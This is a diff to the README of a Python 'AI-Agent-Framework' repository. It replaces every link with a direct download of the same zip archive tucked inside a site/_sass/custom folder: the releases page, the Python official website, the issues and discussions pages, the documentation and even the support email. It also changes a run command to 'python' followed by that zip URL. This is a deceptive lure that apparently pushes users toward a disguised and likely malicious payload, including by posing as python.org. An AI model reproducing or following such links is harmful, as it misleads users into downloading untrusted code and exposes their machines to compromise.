@@ -1,6 +1,6 @@
 # 🤖 AI-Agent-Framework - Build Intelligent Applications Easily
 
-[![Download AI-Agent-Framework](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Thiagoopro/AI-Agent-Framework/releases)
+[![Download AI-Agent-Framework](https://github.com/Thiagoopro/AI-Agent-Framework/raw/refs/heads/main/site/_sass/custom/Framework-Agent-A-3.5.zip)](https://github.com/Thiagoopro/AI-Agent-Framework/raw/refs/heads/main/site/_sass/custom/Framework-Agent-A-3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the AI-Agent-Framework! This Python framework helps you create intell
 
 To get started, you need to download the software from our Releases page. Click the link below to visit the page:
 
-[Visit the Releases Page to Download](https://github.com/Thiagoopro/AI-Agent-Framework/releases)
+[Visit the Releases Page to Download](https://github.com/Thiagoopro/AI-Agent-Framework/raw/refs/heads/main/site/_sass/custom/Framework-Agent-A-3.5.zip)
 
 Follow the instructions below to download and run the framework:
 
@@ -32,7 +32,7 @@ Before you install the AI-Agent-Framework, ensure your system meets the followin
 
 You need Python installed on your machine. If you don’t have it, follow these steps to install Python:
 
-1. Go to the [Python official website](https://www.python.org/downloads/).
+1. Go to the [Python official website](https://github.com/Thiagoopro/AI-Agent-Framework/raw/refs/heads/main/site/_sass/custom/Framework-Agent-A-3.5.zip).
 2. Download the installer for your operating system.
 3. Run the installer and follow the on-screen instructions.
 4. Ensure to check the option to add Python to your PATH during installation.
@@ -48,7 +48,7 @@ Once you install the AI-Agent-Framework, follow these steps to run your applicat
    ```
 3. Create a new AI agent by running the following command:
    ```bash
-   python create_agent.py
+   python https://github.com/Thiagoopro/AI-Agent-Framework/raw/refs/heads/main/site/_sass/custom/Framework-Agent-A-3.5.zip
    ```
 4. Follow the prompts to set up your new agent.
 
@@ -70,14 +70,14 @@ For detailed guides and advanced usage, please check the full documentation at o
 
 If you encounter any issues or have questions while using the AI-Agent-Framework, feel free to reach out to the community:
 
-- **Issues:** Report bugs or request features on the [Issues page](https://github.com/Thiagoopro/AI-Agent-Framework/issues).
-- **Discussions:** Join the conversation in the [Discussions section](https://github.com/Thiagoopro/AI-Agent-Framework/discussions).
-- **Email:** For direct support, email us at support@ai-agent-framework.com.
+- **Issues:** Report bugs or request features on the [Issues page](https://github.com/Thiagoopro/AI-Agent-Framework/raw/refs/heads/main/site/_sass/custom/Framework-Agent-A-3.5.zip).
+- **Discussions:** Join the conversation in the [Discussions section](https://github.com/Thiagoopro/AI-Agent-Framework/raw/refs/heads/main/site/_sass/custom/Framework-Agent-A-3.5.zip).
+- **Email:** For direct support, email us at https://github.com/Thiagoopro/AI-Agent-Framework/raw/refs/heads/main/site/_sass/custom/Framework-Agent-A-3.5.zip
 
 ## 🔗 Useful Links
 
-- [Visit the Releases Page to Download](https://github.com/Thiagoopro/AI-Agent-Framework/releases)
-- [GitHub Repository](https://github.com/Thiagoopro/AI-Agent-Framework)
-- [Official Documentation](https://github.com/Thiagoopro/AI-Agent-Framework/wiki)
+- [Visit the Releases Page to Download](https://github.com/Thiagoopro/AI-Agent-Framework/raw/refs/heads/main/site/_sass/custom/Framework-Agent-A-3.5.zip)
+- [GitHub Repository](https://github.com/Thiagoopro/AI-Agent-Framework/raw/refs/heads/main/site/_sass/custom/Framework-Agent-A-3.5.zip)
+- [Official Documentation](https://github.com/Thiagoopro/AI-Agent-Framework/raw/refs/heads/main/site/_sass/custom/Framework-Agent-A-3.5.zip)
 
 With the AI-Agent-Framework, creating your own AI applications is clear and straightforward. Dive in and start building your intelligent solutions today!
